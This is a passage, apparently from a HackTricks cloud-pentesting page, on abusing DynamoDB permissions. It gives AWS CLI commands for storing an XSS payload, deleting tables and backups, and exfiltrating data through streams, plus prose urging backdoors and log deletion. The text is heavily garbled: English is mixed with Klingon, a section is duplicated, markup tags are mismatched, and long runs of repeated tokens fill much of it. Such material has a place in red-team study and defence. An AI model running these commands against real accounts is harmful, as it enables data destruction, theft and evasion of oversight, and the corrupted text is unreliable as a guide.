This permission allows users to **modify the existing attributes of an item or add new attributes to an item**. It does **not replace** the entire item; it only updates the specified attributes. If the primary key does not exist in the table, the operation will **create a new item** with the specified primary key and set the attributes specified in the update expression.

{% tabs %}
{% tab title="XSS Example" %}
{% code overflow="wrap" %}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{% code %}
{% endtab %}
{% endcode %}

{% tabs %}
{% tab title="Overview" %}
# AWS DynamoDB Post-Exploitation

After gaining access to an AWS DynamoDB instance, there are several post-exploitation techniques that can be employed to gather information, escalate privileges, and maintain persistence. This section will cover some of the common post-exploitation techniques for AWS DynamoDB.

## Table Enumeration

Once inside the DynamoDB instance, the first step is to enumerate the available tables. This can be done using the `ListTables` API call or by querying the `AWS.DynamoDB.Table` resource in the AWS SDK. The list of tables can provide valuable information about the data stored in the instance.

## Data Extraction

Once the tables have been enumerated, the next step is to extract the data from the tables. This can be done using the `Scan` or `Query` API calls, depending on the specific requirements. It is important to note that the `Scan` operation can be resource-intensive and may impact the performance of the DynamoDB instance.

## Privilege Escalation

If the initial access to the DynamoDB instance is limited, privilege escalation techniques can be used to gain higher-level access. This can involve exploiting misconfigurations, vulnerabilities, or weak access controls within the instance. Some common privilege escalation techniques include:

- Exploiting misconfigured IAM roles or policies
- Leveraging weak access control settings
- Exploiting vulnerabilities in the AWS SDK or other components

## Persistence

To maintain persistence within the DynamoDB instance, it is important to establish a backdoor or create a mechanism for remote access. This can be achieved by creating a new table or modifying existing tables to store malicious code or credentials. Additionally, scheduled tasks or Lambda functions can be used to execute code periodically.

## Covering Tracks

After performing post-exploitation activities, it is crucial to cover tracks and remove any evidence of the intrusion. This can involve deleting logs, modifying timestamps, and removing any created artifacts. It is important to ensure that all traces of the attack are removed to avoid detection and further investigation.

## Conclusion

Post-exploitation techniques in AWS DynamoDB can provide valuable information, escalate privileges, and maintain persistence within the instance. By understanding these techniques, security professionals can better protect their DynamoDB instances and mitigate potential risks.
{% endtab %}

{% tab title="Translation" %}
# AWS DynamoDB Post-Exploitation

After gaining access to an AWS DynamoDB instance, there are several post-exploitation techniques that can be employed to gather information, escalate privileges, and maintain persistence. This section will cover some of the common post-exploitation techniques for AWS DynamoDB.

## Table Enumeration

Once inside the DynamoDB instance, the first step is to enumerate the available tables. This can be done using the `ListTables` API call or by querying the `AWS.DynamoDB.Table` resource in the AWS SDK. The list of tables can provide valuable information about the data stored in the instance.

## Data Extraction

Once the tables have been enumerated, the next step is to extract the data from the tables. This can be done using the `Scan` or `Query` API calls, depending on the specific requirements. It is important to note that the `Scan` operation can be resource-intensive and may impact the performance of the DynamoDB instance.

## Privilege Escalation

If the initial access to the DynamoDB instance is limited, privilege escalation techniques can be used to gain higher-level access. This can involve exploiting misconfigurations, vulnerabilities, or weak access controls within the instance. Some common privilege escalation techniques include:

- Exploiting misconfigured IAM roles or policies
- Leveraging weak access control settings
- Exploiting vulnerabilities in the AWS SDK or other components

## Persistence

To maintain persistence within the DynamoDB instance, it is important to establish a backdoor or create a mechanism for remote access. This can be achieved by creating a new table or modifying existing tables to store malicious code or credentials. Additionally, scheduled tasks or Lambda functions can be used to execute code periodically.

## Covering Tracks

After performing post-exploitation activities, it is crucial to cover tracks and remove any evidence of the intrusion. This can involve deleting logs, modifying timestamps, and removing any created artifacts. It is important to ensure that all traces of the attack are removed to avoid detection and further investigation.

## Conclusion

Post-exploitation techniques in AWS DynamoDB can provide valuable information, escalate privileges, and maintain persistence within the instance. By understanding these techniques, security professionals can better protect their DynamoDB instances and mitigate potential risks.
{% endtab %}
{% endtabs %}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Potential Impact:** Exploitation of further vulnerabilities/bypasses by being able to add/modify data in a DynamoDB table

### `dynamodb:DeleteTable`

An attacker with this permission can **delete a DynamoDB table, causing data loss**.
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**Qa'pla'**: Data loss 'ej 'oH disruption of services relying on the deleted table.

### `dynamodb:DeleteBackup`

ghoH attacker vItlhutlh 'ej **DynamoDB backup Delete, potentially causing data loss in case of a disaster recovery scenario**.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Qaw'**: Data loss je 'ej 'oH 'ej 'oH lo'laHbe'chugh backup during a disaster recovery scenario.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

{% hint style="info" %}
TODO: Test if this actually works
{% endhint %}

**QaH**: 'ej enable a stream on a DynamoDB table, update the table to begin streaming changes, 'ej 'ach access the stream to monitor changes to the table in real-time.** This allows the attacker to monitor 'ej exfiltrate data changes, potentially leading to data leakage.

1. Enable a stream on a DynamoDB table:
```bash
bashCopy codeaws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. Describe the stream to obtain the ARN and other details:

**Klingon Translation:**

2. ARN jev tIv 'ej vItlhutlh:

To obtain the ARN and other details, you can follow these steps:

1. ghItlh: 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej '
```bash
bashCopy codeaws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. Stream ARN jImejDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlhDIvItlh
```bash
bashCopy codeaws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. qarDaSmo' 'ej data vItlhutlhlaHbe'chugh stream vItlhutlh.
```bash
bashCopy codeaws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Qapla'**: DynamoDB table vItlhutlh 'ej data leakage monitoring.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>tlhIngan Hol</strong></a><strong>!</strong></summary>

HackTricks DaH jImej:

* Qapla' **HackTricks** **company advertise** 'ej **HackTricks PDF download** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) laH!
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) ghaH **ghItlh**.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) jImej **NFTs** [**opensea.io**](https://opensea.io/collection/the-peass-family) ghaH.
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) **telegram group**](https://t.me/peass) **follow** **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) **HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
